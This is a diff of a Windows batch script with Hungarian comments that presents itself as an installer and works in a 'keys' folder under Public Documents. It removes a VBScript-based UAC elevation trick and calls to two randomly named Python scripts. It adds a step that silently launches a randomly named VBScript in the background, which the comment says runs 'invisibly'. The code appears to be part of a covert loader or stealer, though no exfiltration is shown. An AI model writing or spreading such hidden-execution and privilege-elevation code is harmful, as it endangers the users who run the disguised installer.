@@ -12,11 +12,6 @@ IF %ERRORLEVEL% EQU 0 (
     goto ker_admin
 )
 
-:ker_admin
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
-    cscript //B "%temp%\getadmin.vbs"
-    exit
 
 :: nyelvfüggetlen célmappa
 set "TARGET=%PUBLIC%\Documents\keys"
@@ -26,8 +21,10 @@ if not exist "%TARGET%" mkdir "%TARGET%"
 if not exist "%TARGET%\keys.txt" (
     echo Created by installer > "%TARGET%\keys.txt")
 
-python "%TARGET%\spwww743g7w.py"
-python "%TARGET%\fwsendbfgw.py"
+:: >>> EZ A RÉSZ MÓDOSULT: VBSCRIPT FUTTATÁSA LÁTHATATLANUL <<<
+echo [INFO] A sifustartup5sfgj.vbs inditasa WScript.Shell-lel...
+start "" "wscript.exe" "%TARGET%\sifustartup5sfgj.vbs"
+echo [SIKER] VBScript elindult (háttérben).
 
 :: Számítógép neve (Megbízható módszer: %COMPUTERNAME%)
 set "GEPNEV=%COMPUTERNAME%"
